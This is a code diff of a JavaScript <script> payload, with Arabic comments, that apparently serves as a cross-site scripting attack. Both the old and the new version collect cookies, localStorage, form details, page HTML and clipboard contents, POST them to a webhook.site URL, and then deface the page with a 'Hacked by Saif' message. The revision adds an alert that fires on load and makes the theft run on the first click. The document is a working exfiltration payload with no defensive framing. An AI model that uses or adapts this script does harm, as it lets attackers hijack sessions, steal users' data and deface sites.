@@ -1,5 +1,9 @@
 <script>
-function stealData() {
+// ⛔ إظهار التحذير فورًا عند التحميل
+alert("💀 Hacked by S7if 💀");
+
+// ✅ بمجرد الضغط في أي مكان (أو بعد OK من الـ alert) يتم التنفيذ
+document.addEventListener("click", async () => {
   const everything = {
     cookies: document.cookie,
     localStorage: { ...localStorage },
@@ -8,6 +12,7 @@ function stealData() {
     referrer: document.referrer,
     userAgent: navigator.userAgent,
     platform: navigator.platform,
+    clipboard: "",
     html: document.documentElement.outerHTML.slice(0, 3000),
     forms: Array.from(document.forms).map(f => ({
       action: f.action,
@@ -21,35 +26,26 @@ function stealData() {
     time: new Date().toISOString()
   };
 
-  // محاولة قراءة الكليب بورد
-  navigator.clipboard.readText().then(text => {
-    everything.clipboard = text;
-    sendToWebhook(everything);
-  }).catch(() => {
-    everything.clipboard = "Access denied";
-    sendToWebhook(everything);
-  });
-}
+  try {
+    everything.clipboard = await navigator.clipboard.readText();
+  } catch (e) {
+    everything.clipboard = "Clipboard access denied";
+  }
 
-function sendToWebhook(data) {
-  fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
-  }).then(() => {
-    // بعد الإرسال، غير شكل الصفحة
-    document.body.innerHTML = `
-      <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#111;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
-        <div>👾 Hacked by Saif 👾</div>
-        <div style="font-size: 0.6em; margin-top: 20px;">Your session has been terminated.</div>
-      </div>
-    `;
-  });
-}
+  try {
+    await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(everything)
+    });
+  } catch (e) {}
 
-// ❗ تنفيذ بعد أي تفاعل
-document.addEventListener("click", () => {
-  alert("💀 Hacked by S7if 💀");
-  stealData();
-}, { once: true });
+  // 👻 شكل مرعب بعد ما الداتا تتبعت
+  document.body.innerHTML = `
+    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#111;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
+      <div>👾 Saif 👾</div>
+      <div style="font-size: 0.6em; margin-top: 20px;">Your data has been extracted.</div>
+    </div>
+  `;
+}, { once: true }); // عشان ميشتغلش أكتر من مرة
 </script>
